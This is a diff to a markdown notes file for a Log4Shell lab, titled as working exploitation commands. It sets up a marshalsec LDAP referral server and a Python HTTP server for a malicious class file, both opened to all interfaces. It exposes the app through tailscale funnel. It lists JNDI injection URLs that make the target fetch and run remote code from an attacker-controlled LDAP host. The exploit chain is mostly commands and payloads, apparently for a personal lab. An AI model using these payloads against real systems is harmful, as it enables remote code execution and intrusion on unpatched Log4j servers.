@@ -2,6 +2,9 @@ http://logwebapp.mooo.com:9080/
 http://logwebapp.mooo.com:9080/?search=${jndi:ldap://logwebapp.mooo.com:1389/Exploit}
 
 
+#add line to server hosts file
+127.0.0.1 attacker.local
+
 ## ✅ EXPLOITATION DEMO - WORKING COMMANDS
 
 ### Terminal 1 - Start Vulnerable Application:
@@ -17,7 +20,7 @@ java -cp ".;log4j-core-2.14.1.jar;log4j-api-2.14.1.jar" "-Dcom.sun.jndi.ldap.obj
 cd C:\Log4Shell-Lab\vulnerable-app
 
 # Start LDAP server (marshalsec)
-java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8888/#Exploit"
+java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://localhost:8888/#Exploit" 1389 0.0.0.0
 ```
 
 ### Terminal 3 - Start HTTP Server:
@@ -25,7 +28,7 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8888/#Ex
 cd C:\Log4Shell-Lab\ldap-server\
 
 # Serve malicious class file
-python -m http.server 8888
+python -m http.server 8888 --bind 0.0.0.0
 ```
 
 ### Terminal 4 - if Running from Office:
@@ -37,7 +40,8 @@ tailscale funnel 8080
 ### Terminal 5 - Run the attack from remote:
 ##change the to the URL that tailscale funnel showsvcgh
 https://win11.tailc1d7d3.ts.net/?q=${jndi:ldap://attacker.local:1389/Exploit}
-
+OR
+http://logwebapp.mooo.com:9080/?search=${jndi:ldap://logwebapp.mooo.com:1389/Exploit}
 
 ### Terminal 4 - Launch Exploits:
 
